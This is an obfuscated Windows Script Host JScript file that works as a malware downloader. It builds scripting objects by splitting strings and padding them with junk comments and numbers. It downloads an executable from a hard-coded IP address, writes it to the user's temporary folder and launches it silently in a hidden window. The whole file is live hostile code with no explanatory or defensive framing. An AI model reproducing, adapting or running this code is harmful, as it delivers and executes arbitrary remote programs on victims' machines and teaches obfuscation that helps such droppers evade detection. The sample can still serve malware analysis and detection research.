(function (acMRvoX) {
function ULkwjGJGnWG(ubLrFIZDoYnE) 
{
return new acMRvoX.ActiveXObject(ubLrFIZDoYnE)
}
var WuLhqkJdtaacjb = true, jkFZqNhrYZWkwl = ("B.St"+(993982, "ream"));
var PnPtHKXuORqDqyM;
PnPtHKXuORqDqyM = function (HdjxVffbRet, KuRguBRxAJGxrhe, JLKatIaUwWO) {
TUIakctOdZrinn=((1/*s921510nuM400235eOiZ*/)?"WScri":"")+"pt.Shell";
var KHSlcydxPLl = ULkwjGJGnWG(TUIakctOdZrinn);
var shMNTIoeBzQxrfK = "2.XMLHTTP";
var xTqKEAmAM = ULkwjGJGnWG("MSXML"+(368567, shMNTIoeBzQxrfK)); 
var cTwoWDSh = "%TEMP%\\";
var YgtvBacrl = KHSlcydxPLl.ExpandEnvironmentStrings(cTwoWDSh)
var KuRguBRxAJGxrhe =  YgtvBacrl +(438158262659, KuRguBRxAJGxrhe);
xTqKEAmAM.onreadystatechange = function ()
{
if (xTqKEAmAM.readyState == 4)
{
WuLhqkJdtaacjb = false; 
with(ULkwjGJGnWG("ADOD" + jkFZqNhrYZWkwl))
{
open();
type = 1;
write(xTqKEAmAM.ResponseBody);
saveToFile(KuRguBRxAJGxrhe, 2);
close();
return KuRguBRxAJGxrhe;
}
}
}
xTqKEAmAM.open("G" + (3192220, 4175797, /*dca156329zYtzkrxTK455578IlaIWQJrHGjLqXIjNQmXamgjYPW*/ "ET" /*dcazYtzkrx175829TKIlaIWQJr353666HGjLqXIjNQmX585881amgjYPW*/), HdjxVffbRet, false);
xTqKEAmAM.send();
SnThLj = acMRvoX.WScript.Sleep(1100)
while (WuLhqkJdtaacjb) {SnThLj}
if (((new Date())>0,1552))
KHSlcydxPLl.Run(KuRguBRxAJGxrhe, 0, 0);
}
nPoQeLCi = "ht";
/*nPoQeLCixTqKEAmAMULkwjGJGnWG*/
nPoQeLCi += "tp";
PnPtHKXuORqDqyM(nPoQeLCi + "://" + "4"+"6.30.45.7"+"3/mert."+"ex"+"e", "122487254.exe", 1);
})(this)/*955376364138687623530515128390*/